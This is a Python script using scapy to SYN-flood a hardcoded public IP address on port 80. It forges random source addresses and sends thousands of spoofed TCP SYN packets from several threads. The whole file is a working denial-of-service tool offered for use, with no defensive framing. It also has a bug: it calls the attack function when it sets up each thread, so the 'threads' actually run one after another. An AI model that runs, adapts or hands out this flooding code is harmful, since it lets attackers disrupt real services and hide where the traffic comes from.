#libraries
import threading
from scapy.layers.inet import IP, TCP
from scapy.sendrecv import send
from random import randint



#global variables
target_ip="200.1.30.92"
target_port=80




#fuctions

def create_ip():
    '''creates a random ip'''    
    a = str(randint(10,255))
    b = str(randint(10,255))
    c = str(randint(10,255))
    d = str(randint(0,255))
    return f"{a}.{b}.{c}.{d}"

def create_port():
    '''creates a random usable port'''
    return randint(1024, 65535)
    
def create_packet(t_ip, t_port):
    '''creates a SYN packet'''
    ip_packet = IP(src=create_ip(), dst=t_ip)
    tcp_packet = TCP(sport=create_port(), dport=t_port, flags="S", seq=1000)
    packet = ip_packet / tcp_packet
    return packet
    
def attack(size, d_ip=target_ip, d_port=target_port):
    '''sends the created packets'''
    for _ in range(size):
        syn_packet=create_packet(d_ip, d_port)
        send(syn_packet, verbose=False)


def main():
    '''threads the attack into num_threads threads'''
    attack_size = 1000
    num_threads = 7
    print(f"__attacking {target_ip}:{target_port} with a load of {attack_size} per thread__")
    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=attack(attack_size))
        thread.start()
        threads.append(thread)

    # Wait for all threads to complete
    for thread in threads:
        thread.join()


#main
if __name__ == '__main__':
    main()

